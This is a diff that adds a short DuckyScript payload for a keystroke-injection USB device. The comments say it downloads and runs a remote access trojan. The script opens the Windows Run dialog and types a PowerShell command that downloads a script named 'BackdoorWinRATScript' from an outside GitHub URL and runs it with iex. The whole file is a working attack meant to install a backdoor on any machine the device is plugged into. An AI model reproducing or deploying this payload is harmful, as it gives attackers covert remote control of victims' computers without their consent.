@@ -1,0 +1,10 @@
+REM Arthur: Hacker-service
+REM Description: Will download and execute a exe file that has been converted
+REM from python. Credit to Machine1337 for the RAT.
+DELAY 1000
+GUI r
+DELAY 1500
+STRING powershell -c $e=(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/WilleLX1/F0_BK/main/CustomRawHosters/BackdoorWinRATScript.txt');iex $e
+DELAY 500
+ENTER
+REM DONE!
